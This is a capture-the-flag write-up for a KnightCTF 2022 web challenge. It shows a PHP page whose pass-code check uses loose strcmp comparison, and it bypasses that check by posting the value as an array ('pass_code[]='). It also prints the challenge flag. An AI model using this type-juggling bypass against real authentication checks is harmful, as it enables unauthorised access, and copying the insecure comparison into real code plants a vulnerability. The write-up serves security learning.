# challenge Description

Challenge Link : http://find-pass-code-one.kshackzone.com/

Flag Format : KCTF{something_here}

Note : Burte Force/Fuzzing not required and not allowed.

**Author: NomanProdhan**

-----------------------------------------------------------

in this webpage we get a Pass Code validation input
looking through the source code we find a comment :

> Hi Serafin, I learned something new today. I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the **source** param 

So we need to send a source param

> https://find-pass-code-one.kshackzone.com/?source=

**NOTE**: doesnt matter what u put in the "source" param because it's a dummy param just to view the source code 
in this page we find the php source code :

```
 <?php
require "flag.php";
if (isset($_POST["pass_code"])) {
    if (strcmp($_POST["pass_code"], $flag) == 0 ) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}

if (isset($_GET["source"])) {
    print show_source(__FILE__);
}

?> 
```


Looking through the php manual about strcmp we can see it's vulnerable to a bypass if not used properly 
to put it simply it doesn't matter what is the pass_code or the flag as long as their strcmp gets us a 0 ! so we just need something to return "NULL" 

**NOTE** : NULL == 0 in php

==> Arrays !

Sending a post request using BurpSuite 

> pass_code[]=

And we get our flag ! 

> KCTF Flag : KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}
